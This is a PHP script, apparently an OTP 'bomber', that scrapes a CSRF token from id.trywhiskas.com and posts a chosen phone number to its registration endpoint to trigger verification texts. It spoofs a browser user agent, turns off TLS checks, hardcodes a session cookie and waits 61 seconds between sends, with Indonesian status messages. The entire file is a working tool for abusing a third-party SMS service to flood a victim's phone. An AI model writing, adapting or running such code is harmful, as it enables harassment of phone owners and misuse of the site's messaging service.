<?php
// error_reporting(0);

Class Bom {

	public $no;

	public function sendC($url, $page, $params) {

        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }

        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        $headers[] = 'Cookie: PHPSESSID=a2956063b11be1708aecb0a16af13625; _ga=GA1.2.1113851212.1511884813; _gid=GA1.2.1693517216.1511884813';

        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;

    }

    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }

    public function angka($length = 4)
    {
        $characters = '0123456789';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
        
    }

    public function Verif()
    {
        $url = "https://id.trywhiskas.com/register/phone";
        $no = $this->no;
        $getcsrf = $this->sendC("https://id.trywhiskas.com/register/", null, null);
        $csrf = $this->getStr('type="hidden" name="','" value="',$getcsrf);
        $key = $this->getStr('" value="','"/>',$getcsrf);
        $data = "userMobileNumber={$no}&{$csrf}={$key}";
        $send = $this->sendC($url, null, $data);
        echo $send;die;
        if (preg_match('/mobileNumber/', $send)) {
                print('OTP berhasil Dikirim!<br>');
                flush();
                        ob_flush();
                        sleep(61);
            } else {
                print('OTP Gagal Dikirim!<br>');
                flush();
                        ob_flush();
                        sleep(61);
            }
    }

    
}



